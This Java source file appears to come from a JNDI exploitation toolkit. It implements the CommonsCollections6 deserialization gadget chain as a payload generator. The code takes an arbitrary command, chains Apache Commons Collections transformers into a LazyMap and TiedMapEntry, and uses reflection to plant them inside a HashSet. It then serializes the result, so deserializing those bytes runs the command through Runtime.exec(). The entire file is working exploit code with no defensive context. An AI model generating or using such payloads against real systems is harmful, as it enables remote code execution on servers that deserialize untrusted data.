package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Reflections;
import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * 	Gadget chain:
 * 	    java.io.ObjectInputStream.readObject()
 *             java.util.HashSet.readObject()
 *                 java.util.HashMap.put()
 *                 java.util.HashMap.hash()
 *                     org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
 *                     org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
 *                         org.apache.commons.collections.map.LazyMap.get()
 *                             org.apache.commons.collections.functors.ChainedTransformer.transform()
 *                             org.apache.commons.collections.functors.InvokerTransformer.transform()
 *                             java.lang.reflect.Method.invoke()
 *                                 java.lang.Runtime.exec()
 *
 *     by @matthias_kaiser
 */
public class CommonsCollections6 implements ObjectPayload<Byte> {

    public byte[] getBytes(PayloadType type, String... param) throws Exception {
        String command = param[0];
        final Transformer[] transformers = TransformerUtil.makeTransformer(command);

        Transformer transformerChain = new ChainedTransformer(transformers);

        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "su18");
        HashSet map = new HashSet(1);
        map.add("su18");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception e) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(map);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }

    @Override
    public Byte getObject(String command) throws Exception {
        return null;
    }
}
